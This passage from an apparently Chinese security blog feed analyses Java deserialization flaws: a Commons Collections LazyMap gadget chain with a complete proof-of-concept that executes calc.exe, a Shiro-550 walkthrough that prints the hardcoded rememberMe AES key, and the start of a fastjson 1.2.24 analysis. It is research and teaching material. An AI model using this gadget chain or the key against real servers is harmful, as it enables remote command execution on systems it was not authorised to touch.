class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="comment">// memberValues=LazyMap</span></span><br><span class="line">                Object var6 = <span class="keyword">this</span>.memberValues.get(var4);</span><br><span class="line">                <span class="keyword">if</span> (var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(<span class="keyword">this</span>.type, var4);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                        var6 = <span class="keyword">this</span>.cloneArray(var6);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> var6;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="如何触发AnnotationInvocationHandler-invoke"><a href="#如何触发AnnotationInvocationHandler-invoke" class="headerlink" title="如何触发AnnotationInvocationHandler#invoke()"></a>如何触发AnnotationInvocationHandler#invoke()</h2><p>因为AnnotationInvocationHandler实现了InvocationHandler接口，本身也是InvocationHandler，此时可以借助动态代理特性，对AnnotationInvocationHandler对象进行动态代理，动态代理对象调用任何方法时都会执行AnnotationInvocationHandler#invoke()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">&quot;xxxx&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反射获取AnnotationInvocationHandler</span></span><br><span class="line">Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 先实例化handler，作为处理器，最终目的是执行handler#invoke()</span></span><br><span class="line">InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure>

<h2 id="创建动态代理对象"><a href="#创建动态代理对象" class="headerlink" title="创建动态代理对象"></a>创建动态代理对象</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建动态代理对象</span></span><br><span class="line">Map proxyMap = (Map) Proxy.newProxyInstance(</span><br><span class="line">	Map.class.getClassLoader(),</span><br><span class="line">	<span class="keyword">new</span> Class[]&#123;Map.class&#125;,</span><br><span class="line">	handler</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化AnnotationInvocationHandler对象时把动态代理对象当做参数传入，调用之后跳转invoke()</span></span><br><span class="line">handler= (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure>



<h2 id="反序列化触发过程分析"><a href="#反序列化触发过程分析" class="headerlink" title="反序列化触发过程分析"></a>反序列化触发过程分析</h2><p>单纯看以上代码可能有点头晕，因为牵扯到了实例化了两次InvocationHandler，结合调试更好理解。</p>
<p>在反序列化时，此时memberValues=proxyMap，在执行AnnotationInvocationHandler#readObject()时，执行this.memberValues.entrySet()，此时会触发AnnotationInvocationHandler#invoke(),这里的AnnotationInvocationHandler就是上面代码中第一个实例化的AnnotationInvocationHandler对象，它的memberValues=outerMap，而outerMap是被LazyMap修饰的，在执行到this.memberValues.get(var4)时，实际调用LazyMap#get()，后续就是执行ChainedTransformer的链式调用，最终命令执行</p>
<h2 id="完整poc"><a href="#完整poc" class="headerlink" title="完整poc"></a>完整poc</h2><p>把上述各个环节的代码实现串联</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class lazyMapDemo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new String[] &#123; &quot;calc.exe&quot; &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        innerMap.put(&quot;xxxx&quot;, &quot;xxxx&quot;);</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 反射执行AnnotationInvocationHandler</span><br><span class="line">        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        // 先实例化handler，作为处理器，最终目的是执行对象.invoke()</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 创建动态代理对象</span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(</span><br><span class="line">                Map.class.getClassLoader(),</span><br><span class="line">                new Class[]&#123;Map.class&#125;,</span><br><span class="line">                handler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // 生成AnnotationInvocationHandler对象，目的是反序列化时调用readObject()</span><br><span class="line">        handler= (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        // 序列化</span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream  oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/phith0n/JavaThings">https://github.com/phith0n/JavaThings</a></p>
<p><a href="https://fynch3r.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92">https://fynch3r.github.io/Java反序列化利用链补全计划</a><br><a href="https://su18.org/post/ysuserial">https://su18.org/post/ysuserial</a></p>
]]></content>
  </entry>
  <entry>
    <title>shiro-550 漏洞分析</title>
    <url>/2021/10/02/shiro-550/</url>
    <content><![CDATA[<h2 id="所需环境"><a href="#所需环境" class="headerlink" title="所需环境"></a>所需环境</h2><p>影响版本：shiro&lt;=1.2.4</p>
<h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><p>在AbstractRememberMeManager#onSuccessfulLogin()下断点，使用root/secret选择Remember Me登录</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//always clear any previous identity:</span></span><br><span class="line">    	<span class="comment">// 清理之前认证的用户身份</span></span><br><span class="line">        forgetIdentity(subject);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//now save the new identity:</span></span><br><span class="line">    	<span class="comment">// 登录时是否选择Rememberme或者记住我</span></span><br><span class="line">        <span class="keyword">if</span> (isRememberMe(token)) &#123;</span><br><span class="line">            rememberIdentity(subject, token, info);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;AuthenticationToken did not indicate RememberMe is requested.  &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;RememberMe functionality will not be executed for corresponding account.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进rememberIdentity</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rememberIdentity</span><span class="params">(Subject subject, AuthenticationToken token,AuthenticationInfo authcInfo)</span> </span>&#123;</span><br><span class="line">        PrincipalCollection principals = getIdentityToRemember(subject, authcInfo);</span><br><span class="line">    </span><br><span class="line">    	<span class="comment">// 这时principals值为root，为登录时的用户名</span></span><br><span class="line">        rememberIdentity(subject, principals);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进rememberIdentity</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> </span>&#123;</span><br><span class="line">    	<span class="comment">// 这时accountPrincipals值为root，为登录时的用户名</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">        rememberSerializedIdentity(subject, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进convertPrincipalsToBytes</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">    	<span class="comment">// principals值为root，序列化root为字节数组</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = serialize(principals);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 对root后的字节数组进行加密，跟进</span></span><br><span class="line">            bytes = encrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进encrypt</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] serialized) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] value = serialized;</span><br><span class="line">    	<span class="comment">// 获取加密方式，加密方式为AES CBC PKCS5Padding</span></span><br><span class="line">        CipherService cipherService = getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//进行加密</span></span><br><span class="line">            ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br><span class="line">            value = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看getEncryptionCipherKey()，根据字面意思是获取加密的密钥，因为这里使用AES加密，所以是AES的key，跟进</p>
<p>getEncryptionCipherKey()，发现没有key相关信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public byte[] getEncryptionCipherKey() &#123;</span><br><span class="line">        return encryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>encryptionCipherKey是一个常量，find usages，查找到setEncryptionCipherKey()中对encryptionCipherKey进行了赋值，alt+F7查看調用,发现setCipherKey进行了调用，继续查找调用关系,AbstractRememberMeManager类的构造函数中调用了setCipherKey</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">AbstractRememberMeManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.serializer = <span class="keyword">new</span> DefaultSerializer&lt;PrincipalCollection&gt;();</span><br><span class="line">        <span class="keyword">this</span>.cipherService = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">    	<span class="comment">// 设置key</span></span><br><span class="line">        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DEFAULT_CIPHER_KEY_BYTES为AES加密使用的key，为硬编码</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>此时确认了加密key，跟进cipherService.encrypt()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteSource <span class="title">encrypt</span><span class="params">(<span class="keyword">byte</span>[] plaintext, <span class="keyword">byte</span>[] key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] ivBytes = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">boolean</span> generate = isGenerateInitializationVectors(<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (generate) &#123;</span><br><span class="line">            ivBytes = generateInitializationVector(<span class="keyword">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (ivBytes == <span class="keyword">null</span> || ivBytes.length == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Initialization vector generation is enabled - generated vector&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;cannot be null or empty.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="comment">//此时进行加密</span></span><br><span class="line">        <span class="keyword">return</span> encrypt(plaintext, key, ivBytes, generate);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这时convertPrincipalsToBytes()内部逻辑跟进完成，进入下一步，跟进rememberSerializedIdentity(subject, bytes)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberSerializedIdentity</span><span class="params">(Subject subject, <span class="keyword">byte</span>[] serialized)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">        HttpServletRequest request = WebUtils.getHttpRequest(subject);</span><br><span class="line">        HttpServletResponse response = WebUtils.getHttpResponse(subject);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//base 64 encode it and store as a cookie:</span></span><br><span class="line">        <span class="comment">// 进行base64编码，作为cookie存储</span></span><br><span class="line">        String base64 = Base64.encodeToString(serialized);</span><br><span class="line">		</span><br><span class="line">        Cookie template = getCookie(); <span class="comment">//the class attribute is really a template for the outgoing cookies</span></span><br><span class="line">        Cookie cookie = <span class="keyword">new</span> SimpleCookie(template);</span><br><span class="line">    	<span class="comment">// 把base64编码后的值设置给remeberMe参数</span></span><br><span class="line">        cookie.setValue(base64);</span><br><span class="line">    	<span class="comment">// 保存到请求响应中</span></span><br><span class="line">        cookie.saveTo(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这时，整个加密流程结束，通过上述逻辑，可以总结加密流程如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名序列化---&gt;  AES加密(key硬编码为kPH+bIxk5D2deZiIxcaaaA==)  ---&gt; base64 ---&gt; 作为值存储到cookie的remeberMe参数中</span><br></pre></td></tr></table></figure>



<h2 id="解密流程"><a href="#解密流程" class="headerlink" title="解密流程"></a>解密流程</h2><p>在DefaultSecurityManager#getRememberedIdentity()打断点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">getRememberedIdentity</span><span class="params">(SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">        RememberMeManager rmm = getRememberMeManager();</span><br><span class="line">        <span class="keyword">if</span> (rmm != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 跟进</span></span><br><span class="line">                <span class="keyword">return</span> rmm.getRememberedPrincipals(subjectContext);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">if</span> (log.isWarnEnabled()) &#123;</span><br><span class="line">                    String msg = <span class="string">&quot;Delegate RememberMeManager instance of type [&quot;</span> + rmm.getClass().getName() +</span><br><span class="line">                            <span class="string">&quot;] threw an exception during getRememberedPrincipals().&quot;</span>;</span><br><span class="line">                    log.warn(msg, e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进rmm.getRememberedPrincipals(subjectContext)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> PrincipalCollection <span class="title">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">        PrincipalCollection principals = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 跟进点1</span></span><br><span class="line">            <span class="keyword">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">            <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">            <span class="keyword">if</span> (bytes != <span class="keyword">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//跟进点2</span></span><br><span class="line">                principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">            principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> principals;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>先看getRememberedSerializedIdentity,<strong>英文注释其实已经说明了当前函数的含义，对cookie进行base64解码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                String msg = <span class="string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">                log.debug(msg);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        WebSubjectContext wsc = (WebSubjectContext) subjectContext;</span><br><span class="line">        <span class="keyword">if</span> (isIdentityRemoved(wsc)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        HttpServletRequest request = WebUtils.getHttpRequest(wsc);</span><br><span class="line">        HttpServletResponse response = WebUtils.getHttpResponse(wsc);</span><br><span class="line"></span><br><span class="line">    	<span class="comment">// 获取cookie信息</span></span><br><span class="line">        String base64 = getCookie().readValue(request, response);</span><br><span class="line">        <span class="comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span></span><br><span class="line">        <span class="comment">// ignore cookies that are scheduled for removal</span></span><br><span class="line">        <span class="keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (base64 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            base64 = ensurePadding(base64);</span><br><span class="line">            <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 具体base64解码位置</span></span><br><span class="line">            <span class="keyword">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">            <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="keyword">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> decoded;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//no cookie set - new site visitor?</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再跟进<code>convertBytesToPrincipals</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">convertBytesToPrincipals</span><span class="params">(<span class="keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            bytes = decrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进<code>decrypt</code>，该函数作用是进行AES解密，返回序列化的数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] encrypted) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] serialized = encrypted;</span><br><span class="line">        CipherService cipherService = getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">            serialized = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再进行反序列化deserialize(bytes)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] serializedIdentity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getSerializer().deserialize(serializedIdentity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进deserialize，最终调用了readObject()进行反序列化</p>
<p>总结解密过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取cookie中的rememberMe字段的值 ---&gt; base64解码 ---&gt; AES解密 ---&gt; readObject()反序列化获取到用户名</span><br></pre></td></tr></table></figure>



<h2 id="出现漏洞的原因"><a href="#出现漏洞的原因" class="headerlink" title="出现漏洞的原因"></a>出现漏洞的原因</h2><p>通过上述加解密过程，可知有一个重要环节是作为攻击者是可猜解的，那就是AES加密使用的key，因为是硬编码的。如果攻击者爆破出了可用的key，那么构造一段序列化的恶意payload，按照上述加密流程加密，作为remeberMe的值发送到服务端，如果此时服务端依赖存在漏洞的commons collections版本或者commons beanutils版本，那么攻击者可以触发反序列化漏洞，进行任意命令执行。</p>
]]></content>
      <tags>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson-1.2.24反序列化漏洞 JdbcRowSetImpl链分析</title>
    <url>/2021/10/05/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="所需环境"><a href="#所需环境" class="headerlink" title="所需环境"></a>所需环境</h2><p>影响版本：fastjson&lt;=1.2.24</p>
<h2 id="fastjson基本使用"><a href="#fastjson基本使用" class="headerlink" title="fastjson基本使用"></a>fastjson基本使用</h2><p>User类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setName&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setAge&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fastjson解析用法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FastjsonDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setAge(<span class="number">23</span>);</span><br><span class="line">        user.setName(<span class="string">&quot;jax&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 將对象转换成json字符串</span></span><br><span class="line">        String str1 = JSONObject.toJSONString(user);</span><br><span class="line">        String str2 = JSONObject.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;str1: &quot;</span>+str1);</span><br><span class="line">        System.out.println(<span class="string">&quot;str2: &quot;</span>+str2);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 將json字符串转换成对象</span></span><br><span class="line">        Object parse1 = JSON.parse(str1);</span><br><span class="line">        <span class="comment">// 获取解析出对象的类型</span></span><br><span class="line">        System.out.println(<span class="string">&quot;@type: &quot;</span> + parse1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;str1&#x27;s parse1=&gt; &quot;</span> + parse1);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++&quot;</span>);</span><br><span class="line">        Object parse2 = JSON.parse(str2);</span><br><span class="line">        <span class="comment">// 获取解析出对象的类型</span></span><br><span class="line">        System.out.println(<span class="string">&quot;@type: &quot;</span> + parse2.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;str2&#x27;s parse2=&gt; &quot;</span> + parse2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line">调用了setAge</span><br><span class="line">调用了setName</span><br><span class="line">调用了getAge</span><br><span 